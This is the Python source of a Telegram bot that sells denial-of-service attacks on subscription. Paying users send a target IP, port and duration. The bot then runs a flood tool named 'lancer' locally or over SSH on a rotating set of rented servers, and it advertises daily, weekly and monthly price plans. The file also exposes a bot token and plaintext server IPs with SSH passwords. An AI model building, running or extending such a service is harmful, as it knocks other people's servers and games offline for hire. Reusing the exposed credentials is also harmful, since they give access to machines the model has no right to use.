import telebot
import subprocess
import datetime
import os
import paramiko

bot = telebot.TeleBot('8013938312:AAH2wgu1Gsw29Lo5orDamDs3crFmJlHZYGE')

admin_id = {"6321758394"}

USER_FILE = "users.txt"
LOG_FILE = "log.txt"

vps_list = [
    {"type": "local"},
    {"type": "remote", "ip": "155.138.136.219", "username": "master_ngmatkuyvr", "password": "98Cf7KqktBBs"},
    {"type": "remote", "ip": "70.34.255.101", "username": "master_fptcarnpqt", "password": "jFtHtZf6swW4"}
]

vps_index = 0
bgmi_cooldown = {}
COOLDOWN_TIME = 3
user_offenses = {}
MAX_OFFENSES = 3

def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

def write_users():
    with open(USER_FILE, "w") as file:
        for uid in allowed_user_ids:
            file.write(f"{uid}\n")

allowed_user_ids = read_users()

def log_command(user_id, target, port, time):
    user_info = bot.get_chat(user_id)
    username = "@" + user_info.username if user_info.username else f"UserID: {user_id}"
    with open(LOG_FILE, "a") as file:
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")

def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target: log_entry += f" | Target: {target}"
    if port: log_entry += f" | Port: {port}"
    if time: log_entry += f" | Time: {time}"
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

def execute_remote_ssh(ip, username, password, command):
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(ip, username=username, password=password)
        stdin, stdout, stderr = ssh.exec_command(command)
        output = stdout.read().decode()
        ssh.close()
        return output
    except Exception as e:
        return f"Error: {str(e)}"

def dispatch_attack(target, port, time):
    global vps_index
    vps = vps_list[vps_index]
    command = f"./lancer {target} {port} {time}"
    if vps['type'] == 'local':
        subprocess.run(command, shell=True)
    else:
        execute_remote_ssh(vps['ip'], vps['username'], vps['password'], command)
    vps_index = (vps_index + 1) % len(vps_list)

@bot.message_handler(commands=['start'])
def welcome_start(message):
    name = message.from_user.first_name
    bot.reply_to(message, f"👋 Welcome {name}! Use /help to see available commands.")

@bot.message_handler(commands=['help'])
def show_help(message):
    bot.reply_to(message, '''🤖 Commands:
/bgmi <target> <port> <time> - Launch attack
/mylogs - View your logs
/plan - View plans
/rules - View rules
/admincmd - Admin commands''')

@bot.message_handler(commands=['plan'])
def show_plan(message):
    bot.reply_to(message, '''🌟 VIP Plan:
- 180s attack
- 5min cooldown
- 3 concurrent
💸 Day: ₹100 | Week: ₹400 | Month: ₹1000
DM @hack_chiye''')

@bot.message_handler(commands=['rules'])
def show_rules(message):
    bot.reply_to(message, '''⚠️ Rules:
1. No spamming attacks.
2. One attack at a time.
3. We check logs daily. Violators get banned!''')

@bot.message_handler(commands=['admincmd'])
def admin_cmds(message):
    if str(message.chat.id) in admin_id:
        bot.reply_to(message, '''🔧 Admin Commands:
/add <id> - Add user
/remove <id> - Remove user
/logs - All logs
/vpsstatus - VPS check
/broadcast <msg>
/clearlogs
/cooldowns''')

@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    if user_id not in allowed_user_ids:
        bot.reply_to(message, "You Are Not Authorized.")
        return
    if user_id not in admin_id:
        last = bgmi_cooldown.get(user_id)
        now = datetime.datetime.now()
        if last and (now - last).seconds < COOLDOWN_TIME:
            user_offenses[user_id] = user_offenses.get(user_id, 0) + 1
            if user_offenses[user_id] >= MAX_OFFENSES:
                allowed_user_ids.remove(user_id)
                write_users()
                bot.reply_to(message, "You have been banned due to repeated offenses.")
                return
            remaining = MAX_OFFENSES - user_offenses[user_id]
            bot.reply_to(message, f"Cooldown. You have {remaining} strike(s) left.")
            return
        bgmi_cooldown[user_id] = now

    cmd = message.text.split()
    if len(cmd) == 4:
        target, port, time = cmd[1], int(cmd[2]), int(cmd[3])
        if time > 300:
            bot.reply_to(message, "Time must be ≤ 300s.")
            return
        record_command_logs(user_id, '/bgmi', target, port, time)
        log_command(user_id, target, port, time)
        bot.reply_to(message, f"🔥 Attack Started\nTarget: {target}\nPort: {port}\nTime: {time}s")
        dispatch_attack(target, port, time)
    else:
        bot.reply_to(message, "Usage: /bgmi <target> <port> <time>")

@bot.message_handler(commands=['mylogs'])
def mylogs(message):
    user_id = str(message.chat.id)
    try:
        with open(LOG_FILE, "r") as f:
            logs = f.readlines()
        user_logs = [log for log in logs if f"UserID: {user_id}" in log]
        reply = "📄 Your Logs:\n" + "".join(user_logs) if user_logs else "No logs found."
    except:
        reply = "Log file missing."
    bot.reply_to(message, reply)

@bot.message_handler(commands=['cooldowns'])
def show_offenses(message):
    if str(message.chat.id) not in admin_id:
        bot.reply_to(message, "ONLY OWNER CAN USE.")
        return
    if not user_offenses:
        bot.reply_to(message, "No offenses recorded.")
    else:
        msg = "📛 User Offenses:\n"
        for uid, count in user_offenses.items():
            msg += f"UserID {uid}: {count} offenses\n"
        bot.reply_to(message, msg)

@bot.message_handler(commands=['vpsstatus'])
def vps_status(message):
    if str(message.chat.id) not in admin_id:
        bot.reply_to(message, "ONLY OWNER CAN USE.")
        return
    response = "🔧 VPS Status:\n"
    for i, vps in enumerate(vps_list):
        ip = '127.0.0.1' if vps['type'] == 'local' else vps['ip']
        ping = subprocess.run(['ping', '-c', '1', ip], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        status = "🟢 Online" if ping.returncode == 0 else "🔴 Offline"
        response += f"VPS {i+1} ({ip}): {status}\n"
    bot.reply_to(message, response)

@bot.message_handler(commands=['add'])
def add_user(message):
    if str(message.chat.id) in admin_id:
        cmd = message.text.split()
        if len(cmd) > 1:
            new_user = cmd[1]
            if new_user not in allowed_user_ids:
                allowed_user_ids.append(new_user)
                write_users()
                bot.reply_to(message, f"User {new_user} added.")
            else:
                bot.reply_to(message, "User already exists.")
        else:
            bot.reply_to(message, "Usage: /add <user_id>")
    else:
        bot.reply_to(message, "ONLY OWNER CAN USE.")

@bot.message_handler(commands=['remove'])
def remove_user(message):
    if str(message.chat.id) in admin_id:
        cmd = message.text.split()
        if len(cmd) > 1:
            remove_id = cmd[1]
            if remove_id in allowed_user_ids:
                allowed_user_ids.remove(remove_id)
                write_users()
                bot.reply_to(message, f"User {remove_id} removed.")
            else:
                bot.reply_to(message, "User not found.")
        else:
            bot.reply_to(message, "Usage: /remove <user_id>")
    else:
        bot.reply_to(message, "ONLY OWNER CAN USE.")

while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(e)
